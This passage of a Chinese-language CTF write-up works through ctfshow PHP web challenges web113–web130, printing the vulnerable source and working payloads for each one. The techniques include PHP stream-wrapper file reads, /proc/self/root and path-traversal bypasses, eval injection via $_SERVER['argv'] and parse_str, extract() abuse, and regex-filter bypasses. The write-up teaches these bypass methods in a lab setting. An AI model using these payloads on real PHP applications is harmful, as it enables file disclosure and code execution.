class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这题过滤掉了filter，这个协议就用不了，这里增加一点知识点</p>\n<p><strong>linux里<code>/proc/self/root</code>是指向根目录的</strong></p>\n<p>也就是如果在命令行中输入<code>ls /proc/self/root</code>，其实显示的内容是根目录下的内容</p>\n<p>这里我们多次重复即可绕过<code>is_file</code></p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>\n\n<p>另一种解法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">compress.zlib://flag.php</span><br></pre></td></tr></table></figure>\n\n<p>应该是把flag.php当成压缩文件来读取，具体的不知道。</p>\n<h3 id=\"web114\"><a href=\"#web114\" class=\"headerlink\" title=\"web114\"></a>web114</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">function filter($file)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class=\"line\">        die(&#x27;hacker!&#x27;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return $file;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\">echo &quot;师傅们居然tql都是非预期 哼！&quot;;</span><br><span class=\"line\">if(! is_file($file))&#123;</span><br><span class=\"line\">    highlight_file(filter($file));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>compress</code>和<code>root</code>被ban掉了，</p>\n<p>山重水复疑无路，柳暗花明又一村</p>\n<p><code>filter</code>没有ban</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web115\"><a href=\"#web115\" class=\"headerlink\" title=\"web115\"></a>web115</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function filter($num)&#123;</span><br><span class=\"line\">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    return $num;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$num=$_GET[&#x27;num&#x27;];</span><br><span class=\"line\">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class=\"line\">    if($num==&#x27;36&#x27;)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo &quot;hacker!!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!!!&quot;; </span><br></pre></td></tr></table></figure>\n\n<p><code>trim</code></p>\n<blockquote>\n<p> 去除字符串首尾处的空白字符（或者其他字符）</p>\n<p> 果不指定第二个参数，<strong>trim()</strong> 将去除这些字符</p>\n<ul>\n<li>“ “ (ASCII <em>32</em> (<em>0x20</em>))，普通空格符。</li>\n<li>“\\t” (ASCII <em>9</em> (<em>0x09</em>))，制表符。</li>\n<li>“\\n” (ASCII <em>10</em> (<em>0x0A</em>))，换行符。</li>\n<li>“\\r” (ASCII <em>13</em> (<em>0x0D</em>))，回车符。</li>\n<li>“\\0” (ASCII <em>0</em> (<em>0x00</em>))，空字节符。</li>\n<li>“\\x0B” (ASCII <em>11</em> (<em>0x0B</em>))，垂直制表符。</li>\n</ul>\n</blockquote>\n<p>这里我们写了个脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">for($i=1;$i&lt;=128;$i++)&#123;</span><br><span class=\"line\">    $a=chr($i).&#x27;1&#x27;;</span><br><span class=\"line\">    if(trim($a)!==&#x27;1&#x27;&amp;&amp;is_numeric($a))&#123;</span><br><span class=\"line\">        echo urlencode(chr($i));</span><br><span class=\"line\">        echo &quot;\\n&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后跑出来的结果是 %0c(换页符)</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=%0c36</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web123\"><a href=\"#web123\" class=\"headerlink\" title=\"web123\"></a>web123</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">$c=$_POST[&#x27;fun&#x27;];</span><br><span class=\"line\">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;</span><br><span class=\"line\">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class=\"line\">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class=\"line\">             echo $flag;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里有个很坑的点</p>\n<blockquote>\n<p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：<code>CTF[SHOW.COM</code>&#x3D;&gt;<code>CTF_SHOW.COM</code></p>\n</blockquote>\n<p>也就是说当我面<code>POST</code>  <code>CTF_SHOW.COM</code>时，会自动解析成<code>CTF_SHOW_COM</code></p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST: CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo $flag</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web125\"><a href=\"#web125\" class=\"headerlink\" title=\"web125\"></a>web125</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">$c=$_POST[&#x27;fun&#x27;];</span><br><span class=\"line\">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;</span><br><span class=\"line\">         eval(&quot;$c&quot;.&quot;;&quot;);</span><br><span class=\"line\">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class=\"line\">             echo $flag;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>相比于上一题，题目过路的更多了，echo这些打印函数被过滤</p>\n<p>这里我们详细看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>$_SERVER[‘argv’]：</p>\n<p>1、cli模式（命令行）下</p>\n<pre><code>第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数\n</code></pre>\n<p>2、web网页模式下</p>\n<pre><code>在web页模式下必须在php.ini开启register_argc_argv配置项\n    \n设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果\n    \n这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]\n    \n$argv,$argc在web模式下不适用\n</code></pre>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">我们是在网页模式下的，注意重点：</span><br><span class=\"line\">$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</span><br><span class=\"line\">而 $_SERVER[‘QUERY_STRING’] 是获取查询语句，也就是?后面的语句</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?$fl0g=flag_give_me;</span><br><span class=\"line\"></span><br><span class=\"line\">POST:CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure>\n\n<p>另一种思路</p>\n<p>这里没有过滤<code>highlight_file()</code>于是我们可以构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?1=flag.php</span><br><span class=\"line\">POST:CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web126\"><a href=\"#web126\" class=\"headerlink\" title=\"web126\"></a>web126</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">$c=$_POST[&#x27;fun&#x27;];</span><br><span class=\"line\">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;</span><br><span class=\"line\">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class=\"line\">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class=\"line\">             echo $flag;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>与上题一样，这回多给几个payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get: a=1+fl0g=flag_give_me</span><br><span class=\"line\">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure>\n\n<p>数组中用加号(加号在url中起到空格的作用)分隔<code>$a[1]</code>对应的就是<code>fl0g=flag_give_me</code>，所以下面这种也是可以的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get: a=1+2+fl0g=flag_give_me//加号在url中起到空格的作用</span><br><span class=\"line\">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[2])</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">var_dump($a);</span><br><span class=\"line\"></span><br><span class=\"line\">传入 a=1+fl0g=flag_give_me</span><br><span class=\"line\">结果如下</span><br><span class=\"line\">array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web127\"><a href=\"#web127\" class=\"headerlink\" title=\"web127\"></a>web127</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$ctf_show = md5($flag);</span><br><span class=\"line\">$url = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//特殊字符检测</span><br><span class=\"line\">function waf($url)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $url))&#123;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(waf($url))&#123;</span><br><span class=\"line\">    die(&quot;嗯哼？&quot;);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    extract($_GET);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if($ctf_show===&#x27;ilove36d&#x27;)&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p><code>$_SERVER[&#39;QUERY_STRING&#39;];</code>获取的查询语句是服务端还没url解码的，所以url编码绕过即可：</p>\n</blockquote>\n<p>写个脚本跑一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">function waf($num)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $num))&#123;</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">for($i = 0; $i&lt;129; $i++)&#123;</span><br><span class=\"line\">\t$num=chr($i);</span><br><span class=\"line\">\tif(waf($num))&#123;</span><br><span class=\"line\">\t\techo &quot;未编码：&quot;.$num.&quot;   经过编码：&quot;.urlencode(chr($i)).&quot;\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>空格可以绕过，%20</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ctf show=ilove36d</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web128\"><a href=\"#web128\" class=\"headerlink\" title=\"web128\"></a>web128</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">$f1 = $_GET[&#x27;f1&#x27;];</span><br><span class=\"line\">$f2 = $_GET[&#x27;f2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">if(check($f1))&#123;</span><br><span class=\"line\">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;嗯哼？&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">function check($str)&#123;</span><br><span class=\"line\">    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这题我傻了。。，还是看大师傅的wp吧</p>\n<p>考察点是gettext拓展使用</p>\n<p>在开启该拓展后 _() 等效于 gettext()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo gettext(&quot;phpinfo&quot;);</span><br><span class=\"line\">结果  phpinfo</span><br><span class=\"line\"></span><br><span class=\"line\">echo _(&quot;phpinfo&quot;);</span><br><span class=\"line\">结果 phpinfo</span><br></pre></td></tr></table></figure>\n\n<p>所以 <code>call_user_func(&#39;_&#39;,&#39;phpinfo&#39;)</code> 返回的就是phpinfo</p>\n<p>因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get_defined_vars ( void ) : array</span><br><span class=\"line\">此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web129\"><a href=\"#web129\" class=\"headerlink\" title=\"web129\"></a>web129</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;f&#x27;]))&#123;</span><br><span class=\"line\">    $f = $_GET[&#x27;f&#x27;];</span><br><span class=\"line\">    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;</span><br><span class=\"line\">        echo readfile($f);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>路径穿越很简单</p>\n<p><code>../</code>   回到上一级目录</p>\n<p><code>./</code>    表示当前目录</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?f=../../ctfshow../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web130\"><a href=\"#web130\" class=\"headerlink\" title=\"web130\"></a>web130</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class=\"line\">    $f = $_POST[&#x27;f&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class=\"line\">        die(&#x27;bye!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;</span><br><span class=\"line\">        die(&#x27;bye!!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>preg_match不识别数组，否则返回false，匹配一次返回1，没有返回0</p>\n<p>if(0 &#x3D;&#x3D;&#x3D; flase)返回值为false0不是强等于false的</p>\n<p>stripos()函数对数组不识别，遇到数组会返回null，null!&#x3D;&#x3D;flase</p>\n</blockquote>\n<p>在&#x2F;s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，总之就是ctfshow前面必须得有字符才能匹配到，所以直接f&#x3D;ctfshow就可以了</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?f=ctfshow[]</span><br><span class=\"line\">?f[]=1</span><br><span class=\"line\">?f=ctfshow  (第一个正则匹配时，必须要在ctfshow前面有字符)</span><br></pre></td></tr></table></figure>\n\n<p>下面就要介绍p神的PCRE回溯</p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\" >https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：</p>\n<p>我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。</p>\n<p>脚本</p>\n<figure 